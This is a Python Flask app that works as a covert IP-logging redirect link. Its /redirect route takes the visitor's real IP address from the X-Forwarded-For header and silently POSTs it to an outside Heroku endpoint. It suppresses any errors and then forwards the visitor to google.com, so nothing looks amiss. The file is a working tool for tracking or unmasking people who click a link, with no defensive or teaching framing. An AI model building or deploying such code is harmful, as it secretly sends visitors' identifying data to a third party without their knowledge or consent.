import os
import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# Root route to redirect to /redirect
@app.route('/')
def home():
    return redirect('/redirect')

@app.route('/redirect', methods=['GET'])
def send_ip_and_redirect():
    # Get the real client IP address from the X-Forwarded-For header.
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # Send the IP address to another server
    target_server_url = "https://powerful-castle-33891-b06c61e5b944.herokuapp.com/log_ip"  # Replace with your target server URL
    payload = {"ip": client_ip}

    try:
        # Send the IP as a POST request
        requests.post(target_server_url, json=payload)
    except Exception as e:
        pass  # Silently handle exceptions without logging

    # Redirect the user to google.com
    target_url = "https://google.com"
    return redirect(target_url)

# Test route to check external connectivity
@app.route('/test-connection')
def test_connection():
    try:
        # Try to make a GET request to an external URL (Google in this case)
        response = requests.get("https://google.com")
        
        # Return the status if successful
        return f"Successfully reached Google! Status: {response.status_code}"
    except requests.exceptions.RequestException as e:
        # If there was an issue with the request, return an error message
        return f"Failed to reach Google. Error: {str(e)}"

# Run the app
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
